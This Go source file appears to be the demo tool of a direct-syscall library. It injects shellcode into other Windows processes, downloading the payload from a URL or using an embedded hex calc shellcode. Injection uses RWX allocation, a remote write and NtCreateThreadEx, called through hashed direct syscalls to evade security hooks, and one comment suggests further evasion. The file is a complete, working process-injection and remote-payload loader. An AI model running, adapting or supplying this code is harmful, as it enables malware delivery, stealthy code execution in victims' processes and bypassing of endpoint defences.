package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"
	"unsafe"

	winapi "github.com/carved4/go-direct-syscall"

	"golang.org/x/sys/windows"
)

// getEmbeddedShellcode returns the embedded calc shellcode as bytes
func getEmbeddedShellcode() []byte {
	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"
	
	// Convert hex string to bytes
	bytes := make([]byte, len(hexString)/2)
	for i := 0; i < len(hexString); i += 2 {
		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
		bytes[i/2] = byte(b)
	}
	return bytes
}

// Windows constants that might not be defined in windows package
const (
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	STILL_ACTIVE                      = 259 // STILL_ACTIVE constant
)

// Process information structure
type ProcessInfo struct {
	Pid  uint32
	Name string
}

// SyscallDumpResult represents the complete syscall dump for JSON export
type SyscallDumpResult struct {
	Timestamp   string                     `json:"timestamp"`
	SystemInfo  SystemInfo                 `json:"system_info"`
	Syscalls    []winapi.SyscallInfo       `json:"syscalls"`
	TotalCount  int                        `json:"total_count"`
}

// SystemInfo holds basic system information for the dump
type SystemInfo struct {
	OS           string `json:"os"`
	Architecture string `json:"architecture"`
	NtdllBase    string `json:"ntdll_base"`
}

// downloadPayload downloads shellcode from a URL
func downloadPayload(url string) ([]byte, error) {
	// Create HTTP client with reasonable timeout
	client := &http.Client{
		Timeout: 30 * 1000000000, // 30 seconds
	}
	
	// Make the request
	resp, err := client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("failed to download payload: %v", err)
	}
	defer resp.Body.Close()
	
	// Check response code
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}
	
	// Read the payload
	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %v", err)
	}
	
	fmt.Printf("Downloaded %d bytes of shellcode\n", len(payload))
	return payload, nil
}
// Note the usage of win api here is not the same as using the win api for our real purposes
// if you would like to bypass the usage of win api here, you could sub out the create toolhelp32snapshot function
// for an equivalent ntdll exposed function and call it directly with my libraries' direct syscall func :3
// getProcessList retrieves a list of running processes
func getProcessList() ([]ProcessInfo, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, fmt.Errorf("failed to create process snapshot: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		return nil, fmt.Errorf("Process32First failed: %v", err)
	}

	var processes []ProcessInfo
	for {
		exeFile := windows.UTF16ToString(entry.ExeFile[:])
		
		// Skip system processes with empty names
		if exeFile != "" {
			// Check if we can access this process
			handle, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, entry.ProcessID)
			if err == nil {
				// We can access this process
				windows.CloseHandle(handle)
				processes = append(processes, ProcessInfo{
					Pid:  entry.ProcessID,
					Name: exeFile,
				})
			}
		}

		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}

	// Sort processes by name for easier readability
	sort.Slice(processes, func(i, j int) bool {
		return processes[i].Name < processes[j].Name
	})

	return processes, nil
}

func isProcessRunning(pid uint32) error {
	process, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return fmt.Errorf("failed to open process for verification: %v", err)
	}
	defer windows.CloseHandle(process)

	var exitCode uint32
	err = windows.GetExitCodeProcess(process, &exitCode)
	if err != nil {
		return fmt.Errorf("failed to get process exit code: %v", err)
	}

	if exitCode != STILL_ACTIVE {
		return fmt.Errorf("target process is not running")
	}

	return nil
}

func directSyscallInjector(payload []byte, pid uint32) error {
	if len(payload) == 0 {
		return fmt.Errorf("payload is empty")
	}

	// Verify process is running
	if err := isProcessRunning(pid); err != nil {
		return err
	}

	// Open target process
	process, err := windows.OpenProcess(winapi.PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		return fmt.Errorf("failed to open target process: %v", err)
	}
	defer windows.CloseHandle(process)

	// NtAllocateVirtualMemory using direct syscall library
	var remoteBuffer uintptr
	allocSize := uintptr(len(payload))
	
	status, err := winapi.NtAllocateVirtualMemory(
		uintptr(process),
		&remoteBuffer,
		0,
		&allocSize,
		winapi.MEM_COMMIT|winapi.MEM_RESERVE,
		winapi.PAGE_EXECUTE_READWRITE,
	)

	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory error: %v", err)
	}

	if status != winapi.STATUS_SUCCESS {
		return fmt.Errorf("NtAllocateVirtualMemory failed: %s", winapi.FormatNTStatus(status))
	}

	fmt.Printf("Allocated memory at %#x, status: %s\n", remoteBuffer, winapi.FormatNTStatus(status))

	// NtWriteVirtualMemory using direct syscall library
	var bytesWritten uintptr
	
	status, err = winapi.NtWriteVirtualMemory(
		uintptr(process),
		remoteBuffer,
		unsafe.Pointer(&payload[0]),
		uintptr(len(payload)),
		&bytesWritten,
	)

	if err != nil {
		return fmt.Errorf("NtWriteVirtualMemory error: %v", err)
	}

	if status != winapi.STATUS_SUCCESS {
		return fmt.Errorf("NtWriteVirtualMemory failed: %s", winapi.FormatNTStatus(status))
	}

	if bytesWritten != uintptr(len(payload)) {
		return fmt.Errorf("incomplete write: %d bytes written, expected %d", bytesWritten, len(payload))
	}

	fmt.Printf("Wrote %d bytes, status: %s\n", bytesWritten, winapi.FormatNTStatus(status))

	// NtCreateThreadEx using direct syscall library
	var hThread uintptr
	
	// NtCreateThreadEx requires ALL 11 parameters - Windows expects them all
	status, err = winapi.NtCreateThreadEx(
		&hThread,             // 1. ThreadHandle
		winapi.THREAD_ALL_ACCESS, // 2. DesiredAccess  
		0,                    // 3. ObjectAttributes (NULL)
		uintptr(process),     // 4. ProcessHandle
		remoteBuffer,         // 5. StartRoutine
		0,                    // 6. Argument (NULL)
		0,                    // 7. CreateFlags
		0,                    // 8. ZeroBits  
		0,                    // 9. StackSize
		0,                    // 10. MaximumStackSize
		0,                    // 11. AttributeList (NULL)
	)

	if err != nil {
		return fmt.Errorf("NtCreateThreadEx error: %v", err)
	}

	if status != winapi.STATUS_SUCCESS {
		return fmt.Errorf("NtCreateThreadEx failed: %s", winapi.FormatNTStatus(status))
	}

	fmt.Printf("Created thread: %s\n", winapi.FormatNTStatus(status))

	if hThread != 0 {
		windows.CloseHandle(windows.Handle(hThread))
	}

	return nil
}

func main() {
	// Hash initialization - precompute hashes for common API calls
	winapi.GetFunctionHash("ntdll.dll")
	winapi.GetFunctionHash("NtAllocateVirtualMemory")
	winapi.GetFunctionHash("NtWriteVirtualMemory")
	winapi.GetFunctionHash("NtCreateThreadEx")
	
	// Parse command line flags
	urlFlag := flag.String("url", "", "URL to download shellcode from")
	exampleFlag := flag.Bool("example", false, "Execute embedded calc shellcode")
	dumpFlag := flag.Bool("dump", false, "Dump all available syscalls from ntdll.dll")

	flag.Parse()

	// Check if dump flag is used
	if *dumpFlag {
		fmt.Println("Dumping all available syscalls from ntdll.dll...")
		fmt.Println("=" + strings.Repeat("=", 79))
		
		// Demonstrate NT Status code formatting
		fmt.Println("\nNT Status Code Examples:")
		fmt.Println("------------------------")
		exampleStatuses := []uintptr{
			winapi.STATUS_SUCCESS,
			winapi.STATUS_INFO_LENGTH_MISMATCH,
			winapi.STATUS_INVALID_HANDLE,
			winapi.STATUS_INVALID_PARAMETER,
			winapi.STATUS_ACCESS_DENIED,
			winapi.STATUS_NO_MEMORY,
			0xC0000005, // STATUS_ACCESS_VIOLATION
			0xC000001C, // STATUS_INVALID_PARAMETER_1
		}
		
		for _, status := range exampleStatuses {
			fmt.Printf("  %s\n", winapi.FormatNTStatus(status))
		}
		fmt.Println()
		
		syscalls, err := winapi.DumpAllSyscalls()
		if err != nil {
			fmt.Printf("Failed to dump syscalls: %v\n", err)
			os.Exit(1)
		}
		
		// Sort syscalls by syscall number for better readability
		sort.Slice(syscalls, func(i, j int) bool {
			return syscalls[i].SyscallNumber < syscalls[j].SyscallNumber
		})
		
		// Display to console
		fmt.Printf("%-4s %-40s %-12s %-16s\n", "SSN", "Function Name", "Hash", "Address")
		fmt.Printf("%-4s %-40s %-12s %-16s\n", strings.Repeat("-", 4), strings.Repeat("-", 40), strings.Repeat("-", 12), strings.Repeat("-", 16))
		
		for _, sc := range syscalls {
			fmt.Printf("%-4d %-40s 0x%-10X 0x%-14X\n", 
				sc.SyscallNumber, sc.Name, sc.Hash, sc.Address)
		}
		
		fmt.Printf("\nTotal syscalls found: %d\n", len(syscalls))
		
		// Prepare data for JSON export
		ntdllBase := "0x0"
		if len(syscalls) > 0 {
			// Calculate ntdll base from first syscall address (rough estimate)
			firstAddr := syscalls[0].Address
			// Round down to nearest 64KB boundary (typical DLL alignment)
			baseAddr := firstAddr &^ 0xFFFF
			ntdllBase = fmt.Sprintf("0x%X", baseAddr)
		}
		
		dumpResult := SyscallDumpResult{
			Timestamp: time.Now().Format("2006-01-02T15:04:05Z07:00"),
			SystemInfo: SystemInfo{
				OS:           "Windows",
				Architecture: "x64",
				NtdllBase:    ntdllBase,
			},
			Syscalls:   syscalls,
			TotalCount: len(syscalls),
		}
		
		// Generate filename with timestamp
		filename := fmt.Sprintf("syscall_dump_%s.json", time.Now().Format("20060102_150405"))
		
		// Marshal to JSON with proper indentation
		jsonData, err := json.MarshalIndent(dumpResult, "", "  ")
		if err != nil {
			fmt.Printf("Failed to marshal JSON: %v\n", err)
			os.Exit(1)
		}
		
		// Write to file
		err = os.WriteFile(filename, jsonData, 0644)
		if err != nil {
			fmt.Printf("Failed to write JSON file: %v\n", err)
			os.Exit(1)
		}
		
		fmt.Printf("\n✓ Syscall dump saved to: %s\n", filename)
		fmt.Printf("✓ File size: %.2f KB\n", float64(len(jsonData))/1024)
		return
	}

	var payload []byte
	var err error

	// Check if example flag is used
	if *exampleFlag {
		// Embedded calc shellcode
		payload = getEmbeddedShellcode()
		fmt.Printf("Using embedded calc shellcode (%d bytes)\n", len(payload))
		fmt.Printf("NT Status formatting enabled: Success = %s\n", winapi.FormatNTStatus(winapi.STATUS_SUCCESS))
	} else {
		// Check if URL is provided
		url := *urlFlag
		if url == "" {
			fmt.Println("Error: You must specify either -url, -example, or -dump flag")
			fmt.Println("Usage:")
			fmt.Println("  ./cmd.exe -url http://example.com/payload.bin")
			fmt.Println("  ./cmd.exe -example")
			fmt.Println("  ./cmd.exe -dump")
			os.Exit(1)
		}
		
		// Download the payload
		payload, err = downloadPayload(url)
		if err != nil {
			fmt.Printf("Failed to download payload: %v\n", err)
			return
		}
	}
	
	// Get list of accessible processes
	processes, err := getProcessList()
	if err != nil {
		fmt.Printf("Failed to get process list: %v\n", err)
		return
	}
	
	if len(processes) == 0 {
		fmt.Println("No accessible processes found")
		return
	}
	
	var selectedProcess ProcessInfo
	
	if *exampleFlag {
		// Auto-select a safe process for example mode
		safeProcesses := []string{"notepad.exe", "calc.exe", "mspaint.exe", "wordpad.exe", "write.exe"}
		
		// First try to find a known safe process
		found := false
		for _, safeProc := range safeProcesses {
			for _, proc := range processes {
				if strings.EqualFold(proc.Name, safeProc) {
					selectedProcess = proc
					found = true
					fmt.Printf("Auto-selected safe process: %s (PID: %d)\n", proc.Name, proc.Pid)
					break
				}
			}
			if found {
				break
			}
		}
		
		// If no known safe process found, use the first non-system process
		if !found {
			// Skip common system processes
			systemProcesses := []string{"system", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe", 
				"services.exe", "lsass.exe", "svchost.exe", "dwm.exe", "explorer.exe"}
			
			for _, proc := range processes {
				isSystem := false
				for _, sysProc := range systemProcesses {
					if strings.EqualFold(proc.Name, sysProc) {
						isSystem = true
						break
					}
				}
				if !isSystem {
					selectedProcess = proc
					found = true
					fmt.Printf("Auto-selected process: %s (PID: %d)\n", proc.Name, proc.Pid)
					break
				}
			}
		}
		
		if !found {
			fmt.Println("No suitable safe process found for auto-injection")
			return
		}
	} else {
		// Display process list for manual selection when using URL
		fmt.Println("\nAvailable processes:")
		fmt.Println("-------------------")
		for i, proc := range processes {
			fmt.Printf("[%d] PID: %d - %s\n", i+1, proc.Pid, proc.Name)
		}
		
		// Prompt user to select a process
		var selectedIndex int
		for {
			fmt.Print("\nEnter process number to inject into: ")
			scanner := bufio.NewScanner(os.Stdin)
			if scanner.Scan() {
				input := strings.TrimSpace(scanner.Text())
				
				// Parse the input
				index, err := strconv.Atoi(input)
				if err != nil || index < 1 || index > len(processes) {
					fmt.Printf("Invalid selection. Please enter a number between 1 and %d\n", len(processes))
					continue
				}
				
				selectedIndex = index - 1
				break
			}
			
			if err := scanner.Err(); err != nil {
				fmt.Printf("Error reading input: %v\n", err)
				return
			}
		}
		
		// Get the selected process
		selectedProcess = processes[selectedIndex]
		fmt.Printf("\nSelected: [%d] %s (PID: %d)\n", selectedIndex+1, selectedProcess.Name, selectedProcess.Pid)
	}

	
	// Perform the injection
	fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
	err = directSyscallInjector(payload, selectedProcess.Pid)
	
	if err != nil {
		fmt.Printf("Injection failed: %v\n", err)
	} else {
		fmt.Println("Injection Successful")
	}
}
